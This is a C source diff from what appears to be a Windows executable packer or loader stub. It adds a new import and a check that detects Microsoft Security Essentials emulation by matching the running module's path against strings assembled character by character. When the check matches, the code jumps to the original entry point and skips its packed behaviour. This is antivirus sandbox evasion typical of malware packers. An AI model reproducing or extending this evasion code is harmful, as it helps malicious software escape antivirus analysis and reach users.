@@ -86,28 +86,29 @@ XREFNAMES data_imports[] = {
 			"GetModuleHandleA",		// 32
 			"GetCommandLineA",		// 33
 			"GetCommandLineW",		// 34
+			"GetModuleFileNameA",	// 35
 			NULL
 	}
 	}, // KERNEL32.DLL
 	{ "NTDLL.DLL",
 	{
-			"RtlExitUserProcess",	// 35
+			"RtlExitUserProcess",	// 36
 			NULL
 	}
 	}, // NTDLL.DLL
 	
 	{ "MSVCRT.DLL",
 	{
-		"sprintf",				// 36
-		"exit",					// 37
-		"_exit",				// 38
+		"sprintf",				// 37
+		"exit",					// 38
+		"_exit",				// 39
 		NULL
 	} 
 	}, // USER32.DLL
 	
 	{ "ADVAPI32.DLL",
 	{
-		"GetCurrentHwProfileA", // 39
+		"GetCurrentHwProfileA", // 40
 	}
 	}, // ADVAPI32.DLL
 
@@ -345,6 +346,7 @@ NEXT_ENTRY:
 	ISWOW64PROCESS pfn_IsWow64Process = (ISWOW64PROCESS) dll_calls[CALL_ISWOW64PROCESS];
 	GETCURRENTPROCESS pfn_GetCurrentProcess = (GETCURRENTPROCESS) dll_calls[CALL_GETCURRENTPROCESS];
 	GETMODULEHANDLE pfn_GetModuleHandle = (GETMODULEHANDLE) dll_calls[CALL_GETMODULEHANDLE];
+	GETMODULEFILENAME pfn_GetModuleFileNameA = (GETMODULEFILENAME) dll_calls[CALL_GETMODULEFILENAMEA];
 
 	DWORD imageBase = 0;
 	__asm {
@@ -377,7 +379,32 @@ NEXT_ENTRY:
 	CHECK_CALL( pfn_VirtualProtect );
 	CHECK_CALL( pfn_GetVersionEx );
 	CHECK_CALL( pfn_GetModuleHandle );
+
+
+	/* Check for Microsoft Security Essential emulation */
+
+
 	
+
+	char *fName = (char *)pfn_VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
+	pfn_GetModuleFileNameA(NULL, fName, MAX_PATH);
+	DWORD prgLen = _STRLEN_(fName);
+
+	// x86
+	char x86MspEng[26] = { 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', ' ', 'S', 'e', 'c', 'u', 'r' ,'i', 't', 'y', ' ', 'C', 'l', 'i', 'e', 'n', 't', 0x0 };
+	for(DWORD i=0; i<prgLen; i++)
+		if(!_STRCMP_(fName+i, x86MspEng))
+			goto OEP_CALL;
+
+	// x64
+	char x64MspEng[12] = { ':', '\\', 'm', 'y', 'a', 'p', 'p', '.', 'e', 'x', 'e', 0x0 };
+	if(!_STRCMP_(&fName[1], x64MspEng))
+		goto OEP_CALL;
+
+
+	pfn_VirtualFree(fName, 0, MEM_RELEASE);
+	
+
 	//
 	// *** check for 64bit system
 	//
